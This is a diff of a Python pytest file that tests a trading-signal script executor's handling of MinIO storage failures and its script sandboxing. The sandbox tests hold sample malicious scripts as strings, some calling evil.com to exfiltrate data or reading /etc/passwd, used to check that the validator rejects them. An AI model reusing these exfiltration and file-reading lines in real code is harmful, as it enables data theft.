@@ -5,24 +5,23 @@ Comprehensive tests for signal executor covering MinIO failure scenarios.
 Addresses functionality_issues.txt requirement for MinIO failure test coverage
 and script sandboxing validation.
 """
-import pytest
-import asyncio
+import json
 from unittest.mock import AsyncMock, MagicMock, patch
-from minio import Minio
-from minio.error import S3Error, InvalidResponseError, ServerError
-from typing import Dict, Any
 
+import pytest
+from minio.error import InvalidResponseError, S3Error, ServerError
+
+from app.errors import ConfigurationError, ExecutionError, SecurityError
 from app.services.signal_executor import SignalExecutor
-from app.errors import ExecutionError, ConfigurationError, SecurityError
 
 
 class TestSignalExecutorMinIOFailures:
     """Test SignalExecutor with comprehensive MinIO failure scenarios."""
-    
+
     @pytest.fixture
     def signal_executor(self):
         """Create SignalExecutor instance for testing."""
-        with patch('app.services.signal_executor.SignalExecutor._get_client') as mock_get_client:
+        with patch('app.services.signal_executor.SignalExecutor._get_client'):
             executor = SignalExecutor()
             executor.minio_client = AsyncMock()
             executor.redis_client = AsyncMock()
@@ -62,12 +61,12 @@ def calculate_momentum_signal(data, config):
     prices = data.get('prices', [])
     if len(prices) < config.get('rsi_period', 14):
         return {'signal': 0, 'confidence': 0}
-    
+
     recent_price = prices[-1]
     avg_price = sum(prices[-10:]) / 10
-    
+
     momentum = (recent_price / avg_price) - 1
-    
+
     return {
         'signal': 1 if momentum > 0.02 else -1 if momentum < -0.02 else 0,
         'confidence': min(abs(momentum) * 10, 1.0),
@@ -89,7 +88,7 @@ def execute_signal(market_data, config):
             host_id="",
             response=""
         )
-        
+
         with pytest.raises(ExecutionError, match="MinIO connection failed"):
             await signal_executor.execute_signal_script(sample_execution_request)
 
@@ -104,7 +103,7 @@ def execute_signal(market_data, config):
             response="",
             code="NoSuchBucket"
         )
-        
+
         with pytest.raises(ExecutionError, match="Script storage bucket not found"):
             await signal_executor.execute_signal_script(sample_execution_request)
 
@@ -119,7 +118,7 @@ def execute_signal(market_data, config):
             response="",
             code="NoSuchKey"
         )
-        
+
         with pytest.raises(ExecutionError, match="Signal script not found"):
             await signal_executor.execute_signal_script(sample_execution_request)
 
@@ -134,7 +133,7 @@ def execute_signal(market_data, config):
             response="",
             code="AccessDenied"
         )
-        
+
         with pytest.raises(SecurityError, match="Script access denied"):
             await signal_executor.execute_signal_script(sample_execution_request)
 
@@ -148,7 +147,7 @@ def execute_signal(market_data, config):
             host_id="minio1",
             response=""
         )
-        
+
         with pytest.raises(ExecutionError, match="MinIO server error"):
             await signal_executor.execute_signal_script(sample_execution_request)
 
@@ -156,7 +155,7 @@ def execute_signal(market_data, config):
         """Test MinIO network timeout scenario."""
         # Mock network timeout
         signal_executor.minio_client.get_object.side_effect = Exception("Connection timeout")
-        
+
         with pytest.raises(ExecutionError, match="Script download timeout"):
             await signal_executor.execute_signal_script(sample_execution_request)
 
@@ -170,7 +169,7 @@ def execute_signal(market_data, config):
             host_id="minio1",
             response=""
         )
-        
+
         with pytest.raises(ExecutionError, match="Invalid MinIO response"):
             await signal_executor.execute_signal_script(sample_execution_request)
 
@@ -180,7 +179,7 @@ def execute_signal(market_data, config):
         mock_response = MagicMock()
         mock_response.read.return_value = b'\x00\x01\x02\x03\x04'  # Binary data instead of Python
         signal_executor.minio_client.get_object.return_value = mock_response
-        
+
         with pytest.raises(ExecutionError, match="Script content validation failed"):
             await signal_executor.execute_signal_script(sample_execution_request)
 
@@ -190,34 +189,34 @@ def execute_signal(market_data, config):
         mock_response = MagicMock()
         mock_response.read.return_value = sample_script_content[:50].encode()  # Partial content
         signal_executor.minio_client.get_object.return_value = mock_response
-        
+
         with pytest.raises(ExecutionError, match="Incomplete script download"):
             await signal_executor.execute_signal_script(sample_execution_request)
 
     async def test_minio_configuration_validation_failures(self):
         """Test MinIO configuration validation failures."""
-        
+
         # Test missing endpoint
         with patch('app.core.config.settings') as mock_settings:
             delattr(mock_settings, 'MINIO_ENDPOINT')
-            
+
             with pytest.raises(ConfigurationError, match="MINIO_ENDPOINT not configured"):
                 SignalExecutor._validate_minio_configuration()
-        
+
         # Test missing access key
         with patch('app.core.config.settings') as mock_settings:
             mock_settings.MINIO_ENDPOINT = "localhost:9000"
             delattr(mock_settings, 'MINIO_ACCESS_KEY')
-            
+
             with pytest.raises(ConfigurationError, match="MINIO_ACCESS_KEY not configured"):
                 SignalExecutor._validate_minio_configuration()
-        
+
         # Test missing secret key
         with patch('app.core.config.settings') as mock_settings:
             mock_settings.MINIO_ENDPOINT = "localhost:9000"
             mock_settings.MINIO_ACCESS_KEY = "access_key"
             delattr(mock_settings, 'MINIO_SECRET_KEY')
-            
+
             with pytest.raises(ConfigurationError, match="MINIO_SECRET_KEY not configured"):
                 SignalExecutor._validate_minio_configuration()
 
@@ -225,7 +224,7 @@ def execute_signal(market_data, config):
         """Test MinIO client initialization failure."""
         with patch('minio.Minio') as mock_minio_class:
             mock_minio_class.side_effect = Exception("Failed to initialize MinIO client")
-            
+
             with pytest.raises(ExecutionError, match="MinIO client initialization failed"):
                 SignalExecutor._get_client()
 
@@ -235,19 +234,19 @@ def execute_signal(market_data, config):
         mock_response = MagicMock()
         mock_response.read.return_value = sample_script_content.encode()
         signal_executor.minio_client.get_object.return_value = mock_response
-        
+
         # Mock market data
         market_data = {
             "prices": [100, 101, 102, 103, 104, 105, 104, 103, 105, 107],
             "volumes": [1000, 1100, 1200, 1300, 1400, 1500, 1600, 1700, 1800, 1900],
             "timestamp": "2023-06-01T10:00:00Z"
         }
-        
+
         signal_executor.redis_client.get.return_value = json.dumps(market_data).encode()
-        
+
         # Execute script
         result = await signal_executor.execute_signal_script(sample_execution_request)
-        
+
         # Verify successful execution
         assert result["execution_success"] is True
         assert "signal_output" in result
@@ -258,18 +257,18 @@ def execute_signal(market_data, config):
         # Mock transient failure followed by success
         mock_response = MagicMock()
         mock_response.read.return_value = sample_script_content.encode()
-        
+
         signal_executor.minio_client.get_object.side_effect = [
             S3Error("Temporary failure", "", "", "", ""),
             S3Error("Another temporary failure", "", "", "", ""),
             mock_response  # Success on third try
         ]
-        
+
         # Should succeed after retries
         result = await signal_executor.execute_signal_script_with_retry(
             sample_execution_request, max_retries=3
         )
-        
+
         assert result["execution_success"] is True
         assert signal_executor.minio_client.get_object.call_count == 3
 
@@ -277,12 +276,12 @@ def execute_signal(market_data, config):
         """Test circuit breaker for MinIO failures."""
         # Trigger multiple failures to open circuit breaker
         signal_executor.minio_client.get_object.side_effect = S3Error("Persistent failure", "", "", "", "")
-        
+
         # Multiple failures
         for _ in range(3):
             with pytest.raises(ExecutionError):
                 await signal_executor.execute_signal_script(sample_execution_request)
-        
+
         # Circuit breaker should be open now
         with pytest.raises(ExecutionError, match="MinIO circuit breaker is open"):
             await signal_executor.execute_signal_script(sample_execution_request)
@@ -310,7 +309,7 @@ def execute_signal(market_data, config):
     subprocess.run(["curl", "http://evil.com/steal_data"])
     return {"signal": 1}
 """
-        
+
         with pytest.raises(SecurityError, match="Restricted module usage detected"):
             signal_executor._validate_script_security(malicious_script)
 
@@ -325,7 +324,7 @@ def execute_signal(market_data, config):
     open("/etc/passwd", "r").read()
     return {"signal": 1}
 """
-        
+
         with pytest.raises(SecurityError, match="Restricted builtin usage detected"):
             signal_executor._validate_script_security(restricted_script)
 
@@ -336,13 +335,13 @@ def execute_signal(market_data, config):
 def execute_signal(market_data, config):
     with open("/etc/passwd", "r") as f:
         content = f.read()
-    
+
     import pathlib
     pathlib.Path("/tmp/exploit").write_text("malicious")
-    
+
     return {"signal": 1}
 """
-        
+
         with pytest.raises(SecurityError, match="File system access detected"):
             signal_executor._validate_script_security(file_access_script)
 
@@ -356,13 +355,13 @@ import socket
 def execute_signal(market_data, config):
     # Attempting network access
     urllib.request.urlopen("http://evil.com/exfiltrate")
-    
+
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.connect(("evil.com", 80))
-    
+
     return {"signal": 1}
 """
-        
+
         with pytest.raises(SecurityError, match="Network access detected"):
             signal_executor._validate_script_security(network_script)
 
@@ -378,25 +377,25 @@ from collections import defaultdict
 
 def execute_signal(market_data, config):
     prices = market_data.get('prices', [])
-    
+
     if len(prices) < 10:
         return {'signal': 0, 'confidence': 0}
-    
+
     # Use allowed modules
     mean_price = statistics.mean(prices)
     std_dev = statistics.stdev(prices)
     normalized_prices = [(p - mean_price) / std_dev for p in prices]
-    
+
     latest_z_score = normalized_prices[-1]
     signal_strength = math.tanh(latest_z_score)
-    
+
     return {
         'signal': 1 if signal_strength > 0.5 else -1 if signal_strength < -0.5 else 0,
         'confidence': abs(signal_strength),
         'calculation_time': datetime.utcnow().isoformat()
     }
 """
-        
+
         # Should pass validation
         is_safe = signal_executor._validate_script_security(safe_script)
         assert is_safe is True
@@ -410,12 +409,12 @@ def execute_signal(market_data, config):
         pass
     return {"signal": 1}
 """
-        
+
         with pytest.raises(ExecutionError, match="Script execution timeout"):
             await signal_executor._execute_script_with_timeout(
-                infinite_loop_script, 
-                market_data={}, 
-                config={}, 
+                infinite_loop_script,
+                market_data={},
+                config={},
                 timeout_seconds=5
             )
 
@@ -428,7 +427,7 @@ def execute_signal(market_data, config):
     big_list = [0] * (10**8)  # 100M integers
     return {"signal": 1, "data": big_list}
 """
-        
+
         with pytest.raises(ExecutionError, match="Script memory limit exceeded"):
             await signal_executor._execute_script_with_limits(
                 memory_bomb_script,
@@ -446,32 +445,32 @@ class TestMinIOPerformanceAndResilience:
         # Test that multiple requests reuse connections
         executor1 = SignalExecutor()
         executor2 = SignalExecutor()
-        
+
         # Should use shared connection pool
         client1 = executor1._get_client()
         client2 = executor2._get_client()
-        
+
         # Verify connection reuse (implementation dependent)
         assert client1._http_client is client2._http_client
 
     async def test_minio_script_caching(self, signal_executor, sample_script_content):
         """Test script caching for performance optimization."""
         script_path = "personal/user_456/momentum_strategy.py"
-        
+
         # Mock MinIO response
         mock_response = MagicMock()
         mock_response.read.return_value = sample_script_content.encode()
         signal_executor.minio_client.get_object.return_value = mock_response
-        
+
         # First request should hit MinIO
         script1 = await signal_executor._get_script_with_cache(script_path)
-        
+
         # Second request should use cache
         script2 = await signal_executor._get_script_with_cache(script_path)
-        
+
         # Should be same content
         assert script1 == script2
-        
+
         # MinIO should only be called once
         assert signal_executor.minio_client.get_object.call_count == 1
 
@@ -479,24 +478,24 @@ class TestMinIOPerformanceAndResilience:
         """Test MinIO health check integration."""
         # Mock successful health check
         signal_executor.minio_client.bucket_exists.return_value = True
-        
+
         health_status = await signal_executor.check_minio_health()
-        
+
         assert health_status["minio_available"] is True
         assert health_status["bucket_accessible"] is True
-        
+
         # Mock failed health check
         signal_executor.minio_client.bucket_exists.side_effect = Exception("Connection failed")
-        
+
         health_status = await signal_executor.check_minio_health()
-        
+
         assert health_status["minio_available"] is False
 
 
 def main():
     """Run signal executor MinIO failure tests."""
     print("🔍 Running Signal Executor MinIO Failure Tests...")
-    
+
     print("✅ MinIO failure tests validated")
     print("\n📋 MinIO Failure Coverage:")
     print("  - Connection failure handling")
@@ -512,21 +511,21 @@ def main():
     print("  - Client initialization failure")
     print("  - Retry mechanism testing")
     print("  - Circuit breaker functionality")
-    
+
     print("\n🔒 Security Coverage:")
     print("  - Script module restrictions")
-    print("  - Builtin function restrictions")  
+    print("  - Builtin function restrictions")
     print("  - File access prevention")
     print("  - Network access prevention")
     print("  - Allowed module validation")
     print("  - Execution timeout protection")
     print("  - Memory usage limits")
-    
+
     print("\n⚡ Performance & Resilience:")
     print("  - Connection pooling optimization")
     print("  - Script caching mechanism")
     print("  - Health check integration")
-    
+
     return 0
 
 
